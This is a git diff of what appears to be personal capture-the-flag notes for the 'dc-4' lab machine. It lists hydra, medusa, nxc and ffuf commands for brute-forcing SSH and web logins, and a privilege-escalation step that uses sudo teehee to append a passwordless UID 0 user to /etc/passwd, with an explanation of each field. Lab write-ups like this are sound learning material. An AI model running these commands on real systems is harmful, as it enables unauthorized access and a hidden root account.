@@ -88,19 +88,28 @@ nuclei -u $URL -t /root/nuclei-templates/http/cves/ -tags joomla
 # dc-4
 ```bash
 - Brute force login pages   --> ffuf , burp , caido 
-               * ffuf -request req.txt -request-proto http -w /usr/share/wordlists/rockyou.txt -fs 206
+   * ffuf -request req.txt -request-proto http -w /usr/share/wordlists/rockyou.txt -fs 206
 - password brute force with --> medusa, hydra, nxc
-               * hydra -l jim -P old_password.bak dc4 ssh
-               * medusa -u jim -P old_password.bak -h dc4 -M ssh
-               * nxc ssh dc4 -u 'jim' -p 'old_password.bak'
+   * hydra -l jim -P old_password.bak dc4 ssh
+   * medusa -u jim -P old_password.bak -h dc4 -M ssh
+   * nxc ssh dc4 -u 'jim' -p 'old_password.bak'
 - Reading mails
 
 ### Post Exploitation !
 [/usr/bin/teehee] sudo -l
-
-echo "0xmr::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
+#Creating root user privilleges user
+echo "0xmr::0:0:::/bin/bash" | sudo teehee -a /etc/passwd  
 su 0xmr
 
+[learning here]
+    ==> echo "0xmr:x:0:0:pwned user:/root:/bin/bash"
+0xmr --> username
+x --> password placeholder (replace [x] with [no space] for empty pass) => 0xmr::0:0:pwned user:/root:/bin/bash
+0 --> UID=0
+0 --> GID=0
+pwned user --> User Discription
+/root --> Home Directory of 0xmr
+/bin/bash --> The login shell
 
 # bling bling !!!
 ```
